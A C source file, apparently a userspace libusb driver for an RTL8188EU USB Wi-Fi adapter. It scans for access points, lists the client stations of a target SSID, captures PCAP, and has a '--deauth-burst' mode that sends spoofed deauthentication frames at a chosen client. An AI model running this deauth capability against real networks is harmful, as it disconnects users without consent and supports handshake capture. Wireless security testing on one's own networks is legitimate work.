    const uint8_t *addr2 = frame + 10;
    const uint8_t *addr3 = len >= 24 ? (frame + 16) : NULL;

    if (type == 2 && len >= 24) {
        if (to_ds == 1 && from_ds == 0) {
            if (is_unicast_mac(addr1) && is_unicast_mac(addr2) && memcmp(addr1, addr2, 6) != 0) {
                if (mac_eq(addr1, bssid)) {
                    memcpy(sta_out, addr2, 6);
                    return true;
                }
            }
        } else if (to_ds == 0 && from_ds == 1) {
            if (is_unicast_mac(addr2) && is_unicast_mac(addr1) && memcmp(addr1, addr2, 6) != 0) {
                if (mac_eq(addr2, bssid)) {
                    memcpy(sta_out, addr1, 6);
                    return true;
                }
            }
        }
    } else if (type == 1 && (subtype == 8 || subtype == 10 || subtype == 11) && len >= 16) {
        const uint8_t *ra = addr1;
        const uint8_t *ta = addr2;
        if (is_unicast_mac(ra) && is_unicast_mac(ta) && memcmp(ra, ta, 6) != 0) {
            if (mac_eq(ra, bssid)) {
                memcpy(sta_out, ta, 6);
                return true;
            }
            if (mac_eq(ta, bssid)) {
                memcpy(sta_out, ra, 6);
                return true;
            }
        }
    } else if (type == 0 && (subtype == 0 || subtype == 2 || subtype == 10 || subtype == 11 || subtype == 12) && len >= 24) {
        if (addr3 && is_unicast_mac(addr1) && is_unicast_mac(addr2) && is_unicast_mac(addr3)) {
            if (mac_eq(addr3, bssid)) {
                if (memcmp(addr2, bssid, 6) != 0) {
                    memcpy(sta_out, addr2, 6);
                    return true;
                }
                if (memcmp(addr1, bssid, 6) != 0) {
                    memcpy(sta_out, addr1, 6);
                    return true;
                }
            }
        }
    }
    return false;
}

static bool parse_channel_list(const char *spec, int **out_channels, size_t *out_len) {
    *out_channels = NULL;
    *out_len = 0;
    if (!spec || !spec[0]) return false;

    char *tmp = strdup(spec);
    if (!tmp) return false;

    size_t cap = 32;
    size_t len = 0;
    int *chs = (int *)xmalloc(cap * sizeof(*chs));

    char *saveptr = NULL;
    for (char *tok = strtok_r(tmp, ",", &saveptr); tok; tok = strtok_r(NULL, ",", &saveptr)) {
        while (*tok == ' ' || *tok == '\t') tok++;
        char *end = tok + strlen(tok);
        while (end > tok && (end[-1] == ' ' || end[-1] == '\t')) end--;
        *end = 0;
        if (!tok[0]) continue;

        char *dash = strchr(tok, '-');
        if (dash) {
            *dash = 0;
            int a = atoi(tok);
            int b = atoi(dash + 1);
            if (a <= 0 || b <= 0) { free(chs); free(tmp); return false; }
            if (a > b) { int t = a; a = b; b = t; }
            for (int ch = a; ch <= b; ch++) {
                if (ch < 1 || ch > 14) continue;
                bool exists = false;
                for (size_t i = 0; i < len; i++) if (chs[i] == ch) { exists = true; break; }
                if (exists) continue;
                if (len == cap) { cap *= 2; chs = (int *)xrealloc(chs, cap * sizeof(*chs)); }
                chs[len++] = ch;
            }
        } else {
            int ch = atoi(tok);
            if (ch < 1 || ch > 14) continue;
            bool exists = false;
            for (size_t i = 0; i < len; i++) if (chs[i] == ch) { exists = true; break; }
            if (exists) continue;
            if (len == cap) { cap *= 2; chs = (int *)xrealloc(chs, cap * sizeof(*chs)); }
            chs[len++] = ch;
        }
    }

    free(tmp);
    if (len == 0) { free(chs); return false; }
    *out_channels = chs;
    *out_len = len;
    return true;
}

typedef struct {
    uint8_t mac[6];
    uint32_t seen;
    uint32_t last_tsfl;
} station_entry_t;

static void scan_loop(rtl8188eu_t *d, int bw, const char *scan_channels, int dwell_ms, int read_size, int timeout_ms, bool good_fcs_only, bool include_bad_fcs, const char *target_ssid, int station_scan_time_ms) {
    int *channels = NULL;
    size_t nch = 0;
    if (!parse_channel_list(scan_channels, &channels, &nch)) die("invalid --scan-channels");

    size_t aps_cap = 128;
    size_t aps_len = 0;
    ap_entry_t *aps = (ap_entry_t *)xmalloc(aps_cap * sizeof(*aps));

    bool have_target_bssid = false;
    uint8_t target_bssid[6] = {0};
    int target_channel = 0;

    uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);

    for (size_t ci = 0; ci < nch; ci++) {
        int ch = channels[ci];
        set_channel(d, ch, bw);
        uint64_t end = now_ms() + (uint64_t)dwell_ms;
        while (now_ms() < end) {
            int transferred = 0;
            int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, timeout_ms);
            if (r != 0 || transferred <= 0) continue;

            size_t off = 0;
            int pkt_cnt = 0;
            while (off + 24 <= (size_t)transferred) {
                rxdesc16_t desc;
                if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
                if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
                size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
                size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
                size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
                size_t payload_end = payload_start + (size_t)desc.pktlen;
                if (payload_end > (size_t)transferred) break;

                const uint8_t *payload = buf + payload_start;
                size_t plen = (size_t)desc.pktlen;

                if (desc.rpt_sel == 0 && plen && fc_version(payload, plen) == 0) {
                    if (!include_bad_fcs && (desc.crc32 || desc.icverr)) {
                    } else {
                        uint8_t bssid[6];
                        char ssid[33];
                        int frame_ch = 0;
                        if (extract_ap_info(payload, plen, bssid, ssid, &frame_ch)) {
                            int ap_ch = frame_ch ? frame_ch : ch;
                            size_t idx = (size_t)-1;
                            for (size_t i = 0; i < aps_len; i++) {
                                if (mac_eq(aps[i].bssid, bssid)) { idx = i; break; }
                            }
                            if (idx == (size_t)-1) {
                                if (aps_len == aps_cap) { aps_cap *= 2; aps = (ap_entry_t *)xrealloc(aps, aps_cap * sizeof(*aps)); }
                                idx = aps_len++;
                                memset(&aps[idx], 0, sizeof(aps[idx]));
                                memcpy(aps[idx].bssid, bssid, 6);
                                size_t n = strnlen(ssid, 32);
                                memcpy(aps[idx].ssid, ssid, n);
                                aps[idx].ssid[n] = 0;
                                aps[idx].channel = ap_ch;
                            } else {
                                if (aps[idx].ssid[0] == 0 && ssid[0] != 0) {
                                    size_t n = strnlen(ssid, 32);
                                    memcpy(aps[idx].ssid, ssid, n);
                                    aps[idx].ssid[n] = 0;
                                }
                                if (aps[idx].channel == 0 && ap_ch) aps[idx].channel = ap_ch;
                            }
                            aps[idx].seen++;
                            aps[idx].last_tsfl = desc.tsfl;

                            if (target_ssid && target_ssid[0] && ssid_eq(ssid, target_ssid)) {
                                memcpy(target_bssid, bssid, 6);
                                target_channel = ap_ch;
                                have_target_bssid = true;
                            }
                        }
                    }
                }

                off += pkt_offset;
                pkt_cnt--;
                if (pkt_cnt <= 0) break;
            }
        }
    }

    for (size_t i = 0; i < aps_len; i++) {
        char b[18];
        fmt_mac(aps[i].bssid, b);
        const char *ssid_print = aps[i].ssid[0] ? aps[i].ssid : "<hidden>";
        printf("ch=%02d bssid=%s seen=%" PRIu32 " ssid=%s\n", aps[i].channel, b, aps[i].seen, ssid_print);
    }

    if (have_target_bssid && station_scan_time_ms > 0) {
        int ch = target_channel ? target_channel : d->current_channel;
        set_channel(d, ch, bw);

        char bssid_s[18];
        fmt_mac(target_bssid, bssid_s);
        const char *ssid_print = (target_ssid && target_ssid[0]) ? target_ssid : "<hidden>";
        printf("Scanning stations for SSID='%s' BSSID=%s on channel %d...\n", ssid_print, bssid_s, ch);

        size_t st_cap = 64;
        size_t st_len = 0;
        station_entry_t *stations = (station_entry_t *)xmalloc(st_cap * sizeof(*stations));

        uint64_t end = now_ms() + (uint64_t)station_scan_time_ms;
        while (now_ms() < end) {
            int transferred = 0;
            int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, timeout_ms);
            if (r != 0 || transferred <= 0) continue;

            size_t off = 0;
            int pkt_cnt = 0;
            while (off + 24 <= (size_t)transferred) {
                rxdesc16_t desc;
                if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
                if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
                size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
                size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
                size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
                size_t payload_end = payload_start + (size_t)desc.pktlen;
                if (payload_end > (size_t)transferred) break;

                const uint8_t *payload = buf + payload_start;
                size_t plen = (size_t)desc.pktlen;
                if (desc.rpt_sel == 0 && plen && fc_version(payload, plen) == 0) {
                    if (good_fcs_only && desc.crc32) {
                    } else if (!include_bad_fcs && (desc.crc32 || desc.icverr)) {
                    } else {
                        uint8_t sta[6];
                        if (extract_station(payload, plen, target_bssid, sta) && is_unicast_mac(sta) && memcmp(sta, target_bssid, 6) != 0) {
                            size_t idx = (size_t)-1;
                            for (size_t i = 0; i < st_len; i++) {
                                if (memcmp(stations[i].mac, sta, 6) == 0) { idx = i; break; }
                            }
                            if (idx == (size_t)-1) {
                                if (st_len == st_cap) {
                                    st_cap *= 2;
                                    stations = (station_entry_t *)xrealloc(stations, st_cap * sizeof(*stations));
                                }
                                idx = st_len++;
                                memset(&stations[idx], 0, sizeof(stations[idx]));
                                memcpy(stations[idx].mac, sta, 6);
                            }
                            stations[idx].seen++;
                            stations[idx].last_tsfl = desc.tsfl;
                        }
                    }
                }

                off += pkt_offset;
                pkt_cnt--;
                if (pkt_cnt <= 0) break;
            }
        }

        for (size_t i = 0; i < st_len; i++) {
            for (size_t j = i + 1; j < st_len; j++) {
                if (stations[j].seen > stations[i].seen) {
                    station_entry_t tmp = stations[i];
                    stations[i] = stations[j];
                    stations[j] = tmp;
                }
            }
        }
        for (size_t i = 0; i < st_len; i++) {
            char s[18];
            fmt_mac(stations[i].mac, s);
            printf("  Station: %s seen=%" PRIu32 "\n", s, stations[i].seen);
        }
        free(stations);
    }

    free(buf);
    free(channels);
    free(aps);
}

static void device_init_defaults(rtl8188eu_t *d) {
    memset(d, 0, sizeof(*d));
    d->current_channel = 1;
    d->fops = (fops_8188e_t){
        .total_page_num = 0xA9,
        .page_num_hi = 0x29,
        .page_num_lo = 0x1C,
        .page_num_norm = 0x1C,
        .last_llt_entry = 175,
        .trxff_boundary = 0x25FF,
        .pbp_rx = 0x1,
        .pbp_tx = 0x1,
        .writeN_block_size = 128,
    };
}

static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus, int want_addr, int usb_fd) {
    int r = 0;
    if (usb_fd >= 0) {
#ifdef LIBUSB_OPTION_NO_DEVICE_DISCOVERY
        libusb_set_option(NULL, LIBUSB_OPTION_NO_DEVICE_DISCOVERY);
#endif
        r = libusb_init(&d->ctx);
        if (r != 0) dief("libusb_init failed: %s", libusb_error_name(r));

        libusb_device_handle *h = NULL;
        r = libusb_wrap_sys_device(d->ctx, (intptr_t)usb_fd, &h);
        if (r != 0) dief("libusb_wrap_sys_device failed: %s", libusb_error_name(r));
        d->handle = h;
    } else {
    r = libusb_init(&d->ctx);
    if (r != 0) dief("libusb_init failed: %s", libusb_error_name(r));

    libusb_device **list = NULL;
    ssize_t n = libusb_get_device_list(d->ctx, &list);
    if (n < 0) dief("libusb_get_device_list failed: %s", libusb_error_name((int)n));

    bool found_match = false;
    int first_open_err = 0;
    uint8_t first_bus = 0;
    uint8_t first_addr = 0;

    for (ssize_t i = 0; i < n; i++) {
        libusb_device *dev = list[i];
        struct libusb_device_descriptor desc;
        if (libusb_get_device_descriptor(dev, &desc) != 0) continue;
        if (desc.idVendor != vid || desc.idProduct != pid) continue;

        uint8_t bus = libusb_get_bus_number(dev);
        uint8_t addr = libusb_get_device_address(dev);
        if (want_bus >= 0 && bus != (uint8_t)want_bus) continue;
        if (want_addr >= 0 && addr != (uint8_t)want_addr) continue;

        found_match = true;
        if (first_bus == 0) {
            first_bus = bus;
            first_addr = addr;
        }

        libusb_device_handle *h = NULL;
        r = libusb_open(dev, &h);
        if (r != 0) {
            if (first_open_err == 0) first_open_err = r;
            continue;
        }
        d->handle = h;
        break;
    }

    libusb_free_device_list(list, 1);

    if (!d->handle) {
        if (!found_match) {
            dief("USB device not found: vid=0x%04x pid=0x%04x", vid, pid);
        }
        if (want_bus >= 0 || want_addr >= 0) {
            dief("USB device found but could not be opened (bus=%d addr=%d): %s",
                 want_bus, want_addr, libusb_error_name(first_open_err ? first_open_err : LIBUSB_ERROR_OTHER));
        }
        dief("USB device found but could not be opened (bus=%u addr=%u): %s",
             (unsigned)first_bus, (unsigned)first_addr, libusb_error_name(first_open_err ? first_open_err : LIBUSB_ERROR_OTHER));
    }
    }

    libusb_set_auto_detach_kernel_driver(d->handle, 1);

    int active_cfg = 0;
    r = libusb_get_configuration(d->handle, &active_cfg);
    if (r == 0 && active_cfg == 0) {
        (void)libusb_set_configuration(d->handle, 1);
    }

    libusb_device *dev = libusb_get_device(d->handle);
    struct libusb_config_descriptor *cfg = NULL;
    r = libusb_get_active_config_descriptor(dev, &cfg);
    if ((r != 0 || !cfg) && usb_fd >= 0) {
        r = libusb_get_config_descriptor(dev, 0, &cfg);
    }
    if (r != 0 || !cfg) dief("get_active_config_descriptor failed: %s", libusb_error_name(r));
    if (cfg->bNumInterfaces < 1 || cfg->interface[0].num_altsetting < 1) die("no interfaces/altsettings");
    const struct libusb_interface_descriptor *intf = &cfg->interface[0].altsetting[0];
    d->intf_num = intf->bInterfaceNumber;

    r = libusb_claim_interface(d->handle, d->intf_num);
    if (r != 0) dief("claim_interface failed: %s", libusb_error_name(r));
    (void)libusb_set_interface_alt_setting(d->handle, d->intf_num, 0);

    uint8_t bulk_in = 0;
    uint8_t bulk_out_eps[8];
    int bulk_out = 0;
    for (int i = 0; i < intf->bNumEndpoints; i++) {
        const struct libusb_endpoint_descriptor *ep = &intf->endpoint[i];
        if ((ep->bmAttributes & 0x3) != LIBUSB_TRANSFER_TYPE_BULK) continue;
        uint8_t addr = ep->bEndpointAddress;
        if (addr & 0x80) {
            if (bulk_in == 0) bulk_in = addr;
        } else {
            if (bulk_out < (int)(sizeof(bulk_out_eps) / sizeof(bulk_out_eps[0]))) {
                bulk_out_eps[bulk_out] = addr;
            }
            bulk_out++;
        }
    }
    libusb_free_config_descriptor(cfg);

    if (bulk_in == 0) die("No bulk IN endpoint found");
    d->ep_in = bulk_in;
    if (bulk_out > (int)(sizeof(d->ep_out_eps) / sizeof(d->ep_out_eps[0]))) bulk_out = (int)(sizeof(d->ep_out_eps) / sizeof(d->ep_out_eps[0]));
    d->nr_out_eps = bulk_out;
    d->ep_out_len = bulk_out;
    for (int i = 0; i < bulk_out; i++) d->ep_out_eps[i] = bulk_out_eps[i];
    config_endpoints_no_sie(d);
}

static void close_device(rtl8188eu_t *d) {
    if (d->handle) {
        libusb_release_interface(d->handle, d->intf_num);
        libusb_close(d->handle);
        d->handle = NULL;
    }
    if (d->ctx) {
        libusb_exit(d->ctx);
        d->ctx = NULL;
    }
}

static bool path_exists(const char *p) {
    return p && access(p, R_OK) == 0;
}

static char *exe_dir(void) {
    char buf[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (n <= 0) return strdup(".");
    buf[n] = 0;
    char *slash = strrchr(buf, '/');
    if (!slash) return strdup(".");
    *slash = 0;
    return strdup(buf);
}

static char *path_join(const char *a, const char *b) {
    char *out = NULL;
    if (asprintf(&out, "%s/%s", a, b) < 0) return NULL;
    return out;
}

static char *resolve_firmware_path(const char *arg) {
    if (arg && path_exists(arg)) return strdup(arg);
    char *dir = exe_dir();
    char *p0 = path_join(dir, "firmware/rtl8188eufw.bin");
    free(dir);
    const char *candidates[] = {
        p0,
        "/lib/firmware/rtlwifi/rtl8188eufw.bin",
        "/usr/lib/firmware/rtlwifi/rtl8188eufw.bin",
        "/lib/firmware/rtl8188eufw.bin",
        "/usr/lib/firmware/rtl8188eufw.bin",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (path_exists(candidates[i])) {
            char *out = strdup(candidates[i]);
            free(p0);
            return out;
        }
    }
    free(p0);
    return NULL;
}

static char *default_tables_from(void) {
    char *dir = exe_dir();
    char *p = path_join(dir, "rtl8xxxu_8188e.c");
    free(dir);
    return p;
}

static void usage(const char *prog) {
    fprintf(stderr,
        "usage: %s [options]\n"
        "  -h, --help                  show help\n"
        "  --debug                     verbose debug to stderr\n"
        "  --vid <int>                 default 0x2357\n"
        "  --pid <int>                 default 0x010C\n"
        "  --bus <int>                 optional USB bus number\n"
        "  --address <int>             optional USB device address\n"
        "  --usb-fd <int>              termux-usb file descriptor (no root)\n"
        "  --firmware <path>           default auto\n"
        "  --tables-from <path>        default ./rtl8xxxu_8188e.c (next to executable)\n"
        "  --channel <int>             default 1\n"
        "  --bw <20|40>                default 20\n"
        "  --init-only                 init then exit\n"
        "  --rx                        print RX frames\n"
        "  --scan                      scan for APs\n"
        "  --target-ssid <str>         with --scan, prefer matching SSID\n"
        "  --scan-include-bad-fcs      with --scan, include bad FCS\n"
        "  --scan-channels <spec>      default 1-11 (e.g. 1-11,13,14)\n"
        "  --dwell-ms <int>            default 200\n"
        "  --station-scan-time <int>   default 5000\n"
        "  --pcap <path|- >            write PCAP\n"
        "  --pcap-include-bad-fcs      include bad FCS in pcap\n"
        "  --pcap-with-fcs             keep FCS when possible\n"
        "  --deauth-burst              send deauth bursts and capture to pcap\n"
        "  --target-mac <str>          with --deauth-burst, destination MAC\n"
        "  --bssid <str>               with --deauth-burst, BSSID\n"
        "  --source-mac <str>          with --deauth-burst, source MAC (default bssid)\n"
        "  --reason <int>              with --deauth-burst, reason code (default 8)\n"
        "  --burst-size <int>          with --deauth-burst, frames per burst (default 10)\n"
        "  --burst-interval-ms <int>   with --deauth-burst, delay between bursts (default 1000)\n"
        "  --burst-duration-s <int>    with --deauth-burst, total duration (0 = until Ctrl-C)\n"
        "  --burst-read-timeout-ms <int>  with --deauth-burst, USB read timeout (default 50)\n"
        "  --tx-timeout-ms <int>       with --deauth-burst, USB write timeout (default 100)\n"
        "  --tx-dump-bytes <int>       with --debug, dump first N TX payload bytes\n"
        "  --reads <int>               default 0 (unlimited)\n"
        "  --read-size <int>           default 16384\n"
        "  --timeout-ms <int>          default 1000\n"
        "  --good-fcs-only             filter to good FCS (rx)\n"
        "  --dump-bytes <int>          default 0\n",
        prog
    );
}

int main(int argc, char **argv) {
    const char *prog = "rtl8188eu_libusb";
    bool debug = false;
    uint16_t vid = 0x2357;
    uint16_t pid = 0x010C;
    int bus = -1;
    int address = -1;
    int usb_fd = -1;
    char *firmware_arg = NULL;
    char *tables_from = NULL;
    int channel = 1;
    int bw = 20;
    bool init_only = false;
    bool rx = false;
    bool scan = false;
    char *target_ssid = strdup("");
    bool scan_include_bad_fcs = false;
    char *scan_channels = strdup("1-11");
    int dwell_ms = 200;
    int station_scan_time_ms = 5000;
    char *pcap_path = strdup("");
    bool pcap_include_bad_fcs = false;
    bool pcap_with_fcs = false;
    bool deauth_burst = false;
    char *target_mac_s = strdup("");
    char *bssid_s = strdup("");
    char *source_mac_s = strdup("");
    int reason = 8;
    int burst_size = 10;
    int burst_interval_ms = 1000;
    int burst_duration_s = 0;
    int burst_read_timeout_ms = 50;
    int tx_timeout_ms = 100;
    int tx_dump_bytes = 0;
    int reads = 0;
    int read_size = 16384;
    int timeout_ms = 1000;
    bool good_fcs_only = false;
    int dump_bytes = 0;

    static struct option long_opts[] = {
        {"help", no_argument, 0, 'h'},
        {"debug", no_argument, 0, 35},
        {"vid", required_argument, 0, 1},
        {"pid", required_argument, 0, 2},
        {"bus", required_argument, 0, 3},
        {"address", required_argument, 0, 4},
        {"usb-fd", required_argument, 0, 25},
        {"firmware", required_argument, 0, 5},
        {"tables-from", required_argument, 0, 6},
        {"channel", required_argument, 0, 7},
        {"bw", required_argument, 0, 8},
        {"init-only", no_argument, 0, 9},
        {"rx", no_argument, 0, 10},
        {"scan", no_argument, 0, 11},
        {"target-ssid", required_argument, 0, 12},
        {"scan-include-bad-fcs", no_argument, 0, 13},
        {"scan-channels", required_argument, 0, 14},
        {"dwell-ms", required_argument, 0, 15},
        {"station-scan-time", required_argument, 0, 16},
        {"pcap", required_argument, 0, 17},
        {"pcap-include-bad-fcs", no_argument, 0, 18},
        {"pcap-with-fcs", no_argument, 0, 19},
        {"deauth-burst", no_argument, 0, 26},
        {"target-mac", required_argument, 0, 27},
        {"bssid", required_argument, 0, 28},
        {"source-mac", required_argument, 0, 29},
        {"reason", required_argument, 0, 30},
        {"burst-size", required_argument, 0, 31},
        {"burst-interval-ms", required_argument, 0, 32},
        {"burst-duration-s", required_argument, 0, 33},
        {"burst-read-timeout-ms", required_argument, 0, 34},
        {"tx-timeout-ms", required_argument, 0, 36},
        {"tx-dump-bytes", required_argument, 0, 37},
        {"reads", required_argument, 0, 20},
        {"read-size", required_argument, 0, 21},
        {"timeout-ms", required_argument, 0, 22},
        {"good-fcs-only", no_argument, 0, 23},
        {"dump-bytes", required_argument, 0, 24},
        {0, 0, 0, 0},
    };

    while (1) {
        int idx = 0;
        int c = getopt_long(argc, argv, "h", long_opts, &idx);
        if (c == -1) break;
        switch (c) {
            case 'h': usage(prog); return 0;
            case 35: debug = true; break;
            case 1: vid = (uint16_t)strtoul(optarg, NULL, 0); break;
            case 2: pid = (uint16_t)strtoul(optarg, NULL, 0); break;
            case 3: bus = (int)strtoul(optarg, NULL, 0); break;
            case 4: address = (int)strtoul(optarg, NULL, 0); break;
            case 25: usb_fd = atoi(optarg); break;
            case 5: firmware_arg = strdup(optarg); break;
            case 6: tables_from = strdup(optarg); break;
            case 7: channel = atoi(optarg); break;
            case 8: bw = atoi(optarg); break;
            case 9: init_only = true; break;
            case 10: rx = true; break;
            case 11: scan = true; break;
            case 12: free(target_ssid); target_ssid = strdup(optarg); break;
            case 13: scan_include_bad_fcs = true; break;
            case 14: free(scan_channels); scan_channels = strdup(optarg); break;
            case 15: dwell_ms = atoi(optarg); break;
            case 16: station_scan_time_ms = atoi(optarg); break;
            case 17: free(pcap_path); pcap_path = strdup(optarg); break;
            case 18: pcap_include_bad_fcs = true; break;
            case 19: pcap_with_fcs = true; break;
            case 26: deauth_burst = true; break;
            case 27: free(target_mac_s); target_mac_s = strdup(optarg); break;
            case 28: free(bssid_s); bssid_s = strdup(optarg); break;
            case 29: free(source_mac_s); source_mac_s = strdup(optarg); break;
            case 30: reason = atoi(optarg); break;
            case 31: burst_size = atoi(optarg); break;
            case 32: burst_interval_ms = atoi(optarg); break;
            case 33: burst_duration_s = atoi(optarg); break;
            case 34: burst_read_timeout_ms = atoi(optarg); break;
            case 36: tx_timeout_ms = atoi(optarg); break;
            case 37: tx_dump_bytes = atoi(optarg); break;
            case 20: reads = atoi(optarg); break;
            case 21: read_size = atoi(optarg); break;
            case 22: timeout_ms = atoi(optarg); break;
            case 23: good_fcs_only = true; break;
            case 24: dump_bytes = atoi(optarg); break;
            default: usage(prog); return 2;
        }
    }

    if (bw != 20 && bw != 40) die("bw must be 20 or 40");
    if (channel < 1 || channel > 14) die("channel must be 1..14");
    if (read_size < 512) die("read-size too small");
    if (dwell_ms <= 0) die("dwell-ms must be > 0");
    if (station_scan_time_ms < 0) die("station-scan-time must be >= 0");
    if (burst_size <= 0) die("burst-size must be > 0");
    if (burst_interval_ms < 0) die("burst-interval-ms must be >= 0");
    if (burst_duration_s < 0) die("burst-duration-s must be >= 0");
    if (burst_read_timeout_ms < 0) die("burst-read-timeout-ms must be >= 0");
    if (tx_timeout_ms < 0) die("tx-timeout-ms must be >= 0");
    if (tx_dump_bytes < 0) die("tx-dump-bytes must be >= 0");
    if (reason < 0 || reason > 65535) die("reason must be 0..65535");

    if (optind < argc) {
        if (optind + 1 != argc) die("unexpected extra arguments");
        char *end = NULL;
        errno = 0;
        long v = strtol(argv[optind], &end, 10);
        if (errno != 0 || !end || *end != '\0' || v < 0 || v > INT_MAX) die("invalid usb fd argument");
        if (usb_fd >= 0) die("usb fd specified twice");
        usb_fd = (int)v;
    }

    if (!tables_from) tables_from = default_tables_from();
    if (!path_exists(tables_from)) dief("Tables source not found: %s", tables_from);

    char *firmware_path = resolve_firmware_path(firmware_arg);
    if (!firmware_path) die("Firmware file not found. Provide --firmware or install rtl8188eufw.bin.");

    rtl8188eu_t dev;
    device_init_defaults(&dev);
    if (!load_tables_from_kernel_source(tables_from, &dev.tables)) die("Failed to parse tables from --tables-from");

    open_device(&dev, vid, pid, bus, address, usb_fd);
    init_device(&dev, firmware_path, channel, bw);

    if (debug) {
        fprintf(stderr, "USB: intf=%d ep_in=0x%02x bulk_out=%d", dev.intf_num, dev.ep_in, dev.ep_out_len);
        for (int i = 0; i < dev.ep_out_len; i++) fprintf(stderr, " ep_out[%d]=0x%02x", i, dev.ep_out_eps[i]);
        fprintf(stderr, "\n");
    }

    if (init_only) {
        close_device(&dev);
        free_tables(&dev.tables);
        free(firmware_arg);
        free(firmware_path);
        free(tables_from);
        free(pcap_path);
        free(target_ssid);
        free(scan_channels);
        free(target_mac_s);
        free(bssid_s);
        free(source_mac_s);
        return 0;
    }

    if (scan) {
        scan_loop(&dev, bw, scan_channels, dwell_ms, read_size, timeout_ms, good_fcs_only, scan_include_bad_fcs, target_ssid, station_scan_time_ms);
        close_device(&dev);
        free_tables(&dev.tables);
        free(firmware_arg);
        free(firmware_path);
        free(tables_from);
        free(pcap_path);
        free(target_ssid);
        free(scan_channels);
        free(target_mac_s);
        free(bssid_s);
        free(source_mac_s);
        return 0;
    }

    if (deauth_burst) {
        if (!pcap_path[0]) die("--pcap is required with --deauth-burst");
        if (!target_mac_s[0] || !bssid_s[0]) die("--target-mac and --bssid are required with --deauth-burst");
        uint8_t target_mac[6], bssid[6], source_mac[6];
        if (!parse_mac_addr(target_mac_s, target_mac)) die("invalid --target-mac");
        if (!parse_mac_addr(bssid_s, bssid)) die("invalid --bssid");
        if (source_mac_s[0]) {
            if (!parse_mac_addr(source_mac_s, source_mac)) die("invalid --source-mac");
        } else {
            memcpy(source_mac, bssid, 6);
        }

        FILE *fp = NULL;
        if (strcmp(pcap_path, "-") == 0) fp = stdout;
        else fp = fopen(pcap_path, "wb");
        if (!fp) dief("Failed to open pcap: %s", pcap_path);

        signal(SIGINT, on_signal);
        signal(SIGTERM, on_signal);

        deauth_burst_loop(
            &dev,
            fp,
            target_mac,
            bssid,
            source_mac,
            (uint16_t)reason,
            burst_size,
            burst_interval_ms,
            burst_duration_s,
            burst_read_timeout_ms,
            reads,
            read_size,
            pcap_include_bad_fcs,
            pcap_with_fcs,
            tx_timeout_ms,
            debug,
            tx_dump_bytes
        );

        if (fp != stdout) fclose(fp);
        close_device(&dev);
        free_tables(&dev.tables);
        free(firmware_arg);
        free(firmware_path);
        free(tables_from);
        free(pcap_path);
        free(target_ssid);
        free(scan_channels);
        free(target_mac_s);
        free(bssid_s);
        free(source_mac_s);
        return 0;
    }

    if (pcap_path[0]) {
        FILE *fp = NULL;
        if (strcmp(pcap_path, "-") == 0) fp = stdout;
        else fp = fopen(pcap_path, "wb");
        if (!fp) dief("Failed to open pcap: %s", pcap_path);
        capture_pcap(&dev, fp, reads, read_size, timeout_ms, pcap_include_bad_fcs, pcap_with_fcs);
        if (fp != stdout) fclose(fp);
        close_device(&dev);
        free_tables(&dev.tables);
        free(firmware_arg);
        free(firmware_path);
        free(tables_from);
        free(pcap_path);
        free(target_ssid);
        free(scan_channels);
        free(target_mac_s);
        free(bssid_s);
        free(source_mac_s);
        return 0;
    }

    if (rx) {
        rx_loop(&dev, reads, read_size, timeout_ms, good_fcs_only, dump_bytes);
    }

    close_device(&dev);
    free_tables(&dev.tables);
    free(firmware_arg);
    free(firmware_path);
    free(tables_from);
    free(pcap_path);
    free(target_ssid);
    free(scan_channels);
    free(target_mac_s);
    free(bssid_s);
    free(source_mac_s);
    return 0;
}
